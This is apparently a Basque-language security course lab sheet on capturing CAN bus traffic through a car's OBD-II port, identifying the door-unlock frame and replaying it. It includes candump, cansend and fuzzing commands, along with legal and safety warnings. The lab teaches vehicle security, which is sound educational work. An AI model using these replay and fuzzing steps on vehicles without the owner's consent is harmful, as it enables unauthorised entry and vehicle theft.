# E Praktika — Replay erasoa benetako ibilgailuan

[Versión en castellano](08_Practica_E_Coche_Real.md)

**Gutxi gorabeherako iraupena:** 60 minutu  
**Zailtasuna:** Altua  
**Tresnak:** `candump`, `cansend`, `scripts/replay_attack.py`, SavvyCAN, CAN-USB egokigailua

---

## Helburua

CAN-USB egokigailu bat benetako ibilgailu baten OBD-II portura konektatu, CAN karoseria-buseko trafiko pasiboa kapturatu, ateak blokeatzeko/desblokeatzeko tramak korrelazioaren bidez identifikatu, eta jatorrizko agintea erabili gabe desblokeo-ekintza erreproduzitu.

---

## Testuingurua

Aurreko praktiketako teknikak ICSim-en eta benetako ibilgailuen gainean berdinak dira. CAN protokoloak ez du:
- Tramen jatorriaren autentifikaziorik.
- Enkriptaziorik.
- Replay-kontrako mekanismorik.

Horrek esan nahi du busera konektatutako edozein gailuk trafiko guztia irakur dezakeela eta edozein komando bidal dezakeela. Miller eta Valasek-ek DEF CON 2015-ean frenoak, gidatzea eta transmisioa urrunetik kontrola zitezkeela frogatu zuten. Praktika honetan helburua kontserbadorea da: **ateak desblokeatzeko seinalea identifikatu eta erreproduzitu**.

> ⚠️ **Abisu juridikoa eta segurtasunekoa:**
> - Soilik norberaren ibilgailuan edo jabearen baimena dugunean egin.
> - Ibilgailua aparkatuta egon behar da, motorra martxan edo kontaktua jarrita.
> - Ez injektatu tramak ibilgailua mugitzen ari den bitartean.
> - Ez aldatu gidatzea, balaztak edo airbag-ekin lotutako tramak.
> - Capturak soilik ikastaroko ekipoetan gorde — benetako ibilgailuen logak ez zabaldu.

---

## Ibilgailu tipiko baten bus arkitektura

```
┌─────────────────────────────────────────────────────────┐
│  HS-CAN  500 kbps   Motorra, ABS, transmisioa, airbag   │
│  MS-CAN  125/250 kbps  Ateak, argiak, klimatizazioa     │  ← praktika honen helburua
│  LIN bus  Sentsore indibidualak (leihoak, eserlekuak)   │
│                          │                              │
│                    [Gateway ECU]                        │
│                          │                              │
│                    [OBD-II portua]  ← sarbide-puntua   │
└─────────────────────────────────────────────────────────┘
```

> 2018 baino lehenagoko ibilgailuetan, OBD-II-ak normalean bi busak erakusten ditu (HS-CAN eta MS-CAN).
> Gateway duten ibilgailu modernoagoetan, baliteke OBD-II-tik HS-CAN soilik eskuragarri egotea.

---

## Beharrezko hardware-a

| Gailua | Prezioa (gutxi gora) | Oharrak |
|---|---|---|
| **CANable v2** | ~25€ | Gomendatua — SocketCAN natiboa Linuxen, driverrik gabe |
| PEAK PCAN-USB | ~300€ | Profesionala, oso egonkorra |
| USBtin | ~50€ | Ekonomikoa, SocketCAN bateragarria |
| **OBD-II cable ar-tik terminaletara** | ~5€ | Autora konektatzeko ezer aldatu gabe |
| Linux portaila (edo Linux VM) | — | USB eskuragarriarekin |

**OBD-II → CAN egokigailuaren konexioa:**

```
OBD-II 6. pina  →  CAN-H
OBD-II 14. pina →  CAN-L
OBD-II 16. pina →  +12V  (egokigailuaren elikadura, behar badu)
OBD-II 4/5. pina → GND
```

---

## Aurrebaldintzak

- A, B eta C praktikak ICSim-en gainean eginda.
- CAN-USB egokigailua eskuragarri eta portailara konektatuta.
- Ibilgailua aparkatuta, kontaktua jarrita edo motorra martxan.
- `can-utils` instalatuta: `sudo apt install -y can-utils`
- SavvyCAN eskuragarri (`./SavvyCAN.AppImage`).

---

## E.1 Ariketa — CAN interfazea konfiguratu

### Interfazea altxatu

**CANable v2**-rekin (`/dev/ttyACM0` edo `/dev/ttyUSB0` bezala agertzen da):

```bash
# Gailua identifikatu
ls /dev/ttyACM* /dev/ttyUSB*

# Interfazea 500 kbps-tan altxatu (HS-CAN — powertrain abiaduraren estandarra)
sudo slcand -o -c -s6 /dev/ttyACM0 can0
sudo ip link set can0 up

# Egiaztatu
ip link show can0
```

| Abiadura | `slcand` kodea | Bus ohikoa |
|---|---|---|
| 125 kbps | `-s4` | LIN gateway, zenbait MS-CAN |
| 250 kbps | `-s5` | MS-CAN karoseria |
| 500 kbps | `-s6` | HS-CAN motorra/ABS ← hemen hasi |
| 1 Mbps | `-s8` | Ibilgailu moderno batzuk |

### Trafiko egiaztatu

```bash
candump can0
```

Tramak etengabe agertzen badira → bus zuzena abiadurara egokituta.  
Ezer agertzen ez bada → beste abiadurarekin saiatu (`-s6` aldatu `-s5`-ekin).

---

## E.2 Ariketa — Kaptura korrelatua

Helburua da trafiko kapturatzea **jatorrizko agintea erabiltzen den bitartean**, ekintza fisikoa CAN tramarekin korrelatzeko.

### Prozedura

**1. terminala — kaptura hasi:**
```bash
candump -l can0
# Automatikoki sortzen du: candump-YYYYMMDD-HHMMSS.log
```

**2. terminala — gertaerak timestamp-arekin erregistratu:**
```bash
echo "$(date +%s%3N) KAPTURA_HASIERA" >> gertaerak.txt

# 3 segundo itxaron reposo egoeran...

echo "$(date +%s%3N) BLOKEOA" >> gertaerak.txt
# → sakatu BLOKEATU botoia jatorrizko agintean
# → 2 segundo itxaron
echo "$(date +%s%3N) BLOKEOA_AMAIERA" >> gertaerak.txt

# 3 segundo itxaron reposo egoeran...

echo "$(date +%s%3N) DESBLOKEOA" >> gertaerak.txt
# → sakatu DESBLOKEATU botoia jatorrizko agintean
# → 2 segundo itxaron
echo "$(date +%s%3N) DESBLOKEOA_AMAIERA" >> gertaerak.txt

# Errepikatu zikloa 3 aldiz koherentzia baieztatze aldera
```

**Kaptura gelditu:**
```bash
# Ctrl+C 1. terminalean
ls -lh candump-*.log   # fitxategiak edukia duela egiaztatu
```

---

## E.3 Ariketa — SavvyCAN-ekin analisia

### Kaptura kargatu

```bash
./SavvyCAN.AppImage
# File → Load Frames → candump-*.log hautatu
```

### Ateko tramak identifikatu

1. ID zerrenda begiratu — karoseria-busek normalean `0x100`–`0x4FF` tarteko IDak dituzte
2. Blokeoa/desblokeoa momentuetan **ráfaga labur batean agertzen diren** IDak bilatu (2–5 trama)
3. Ateko komandoen ezaugarri tipikoak:
   - 1-4 byteko DLC
   - Agintea sakatzean soilik agertzen dira (ez dira periodikoak)
   - ID berberak datu desberdinak ditu blokeatzeko eta desblokeatzeko

### Denbora-leihotik iragazten

SavvyCAN-en:  
**Tools → Signal Viewer** → denboraren arabera ordenatu → `gertaerak.txt`-ko `DESBLOKEOA` gertaeraren timestamp-aren tartea kokatu

Edo zuzenean logaren gainean `grep`-arekin:
```bash
awk '$1 >= 1234567890.000 && $1 <= 1234567892.000' candump-*.log
```

### Hautagaiak anotatu

Dokumentatu txostenean ID susmagarriak:

| ID | DLC | Datuak blokeoan | Datuak desblokeoan |
|---|---|---|---|
| `0x???` | ? | `?? ?? ??` | `?? ?? ??` |

---

## E.4 Ariketa — Desblokeoaren replay-a

### A aukera — `cansend` zuzenean

Desblokeatzeko trama identifikatu ondoren:

```bash
# ID eta datuak E.3-an aurkitutakoekin ordezkatu
cansend can0 3B0#020000

# Ibilgailuak ráfaga behar badu:
for i in {1..5}; do cansend can0 3B0#020000; sleep 0.01; done
```

### B aukera — Denbora-leiho-ko replay scripta

```bash
python3 scripts/replay_attack.py \
    --interface can0 \
    --file candump-*.log \
    --filter 0x3B0 \
    --start 1234567893.000 \
    --end   1234567895.000
```

### Espero den emaitza

Ateak jatorrizko agintea erabili gabe desblokeatzen dira.

> Erantzunik ez badago, egiaztatu:
> 1. ID zuzena al da? — E.3 xehetasun gehiagorekin errepikatu
> 2. Bus zuzenean al zaude? — ateak MS-CAN-en 250 kbps-tan egon daitezke
> 3. Ibilgailuak trama-sekuentzia bat behar al du? — tarteko replay osoa erabili

---

## E.5 Ariketa — Fuzzing zuzendua (E.3-k IDa identifikatzen ez badu)

Korrelazioaren bidez trama isolatzea lortzen ez bada, fuzzing-a aplikatu karoseriako ID tipikoen tartean:

```bash
python3 scripts/fuzz_can.py \
    --interface can0 \
    --id 0x3B0 \
    --byte 0 \
    --min 0x00 \
    --max 0x0F \
    --interval 0.5
```

Ateak noiz erreakzionatzen duten fisikoki behatu. **Norbait ibilgailua begiratzen egon dadin** fuzzing-a exekutatzen den bitartean.

> ⚠️ Fuzzing-ak beste funtzio batzuk aktibatu ditzake (alarma, argiak, klaxona). Exekutatu aurretik kontuan hartu.

---

## ICSim vs benetako ibilgailua — konparaketa

| Alderdia | ICSim (simuladorea) | Benetako ibilgailua |
|---|---|---|
| ID ezagunak | Bai (dokumentatuta) | Ez — aurkitu behar dira |
| Buseko ID kopurua | ~10 | 50–200+ |
| Bus anizkoitzak | Ez | Bai (HS/MS/LIN) |
| Gateway | Ez | Posible 2018 ondoko modeloetan |
| Kalte-arriskua | Bat ere ez | Baxua ateak soilik replay-ean |
| Ikusgarri den emaitza | Pantaila simulatua | Benetako atea irekitzen da |

---

## Hausnarketa galderak

1. Zein desberdintasun dago benetako ibilgailuarekiko alderantzizko ingeniaritzaren prozesuan ICSim simuladorearekin alderatuta?
2. Zergatik da zailagoa ateko trama isolatzea bus errealean ICSim-en baino?
3. Zer segurtasun-neurri ezar lezake fabrikatzaile batek replay hau funtzionatzeari eragozteko?
4. Zer desberdintasun dago parkingean grabatutako replay eraso baten eta denbora errealeko eraso baten artean?
5. Nola eragiten dio CAN gateway baten presentziak eraso honen bideragarritasunari OBD-II-tik?

---

## Ebidentziak txostenerako

- [ ] `ip link show can0` interfazea UP duela erakusten duen pantaila-argazkia
- [ ] Identifikatutako IDa erakusten duen `candump-*.log` zatia
- [ ] ID hautagaia hautatuta duen SavvyCAN-eko pantaila-argazkia
- [ ] Ateak desblokeatzen diren momentuko pantaila-argazkia edo bideoa
- [ ] Dokumentatutako ID hautagaien taula (E.3 ariketa)
- [ ] Hausnarketa galderen erantzunak
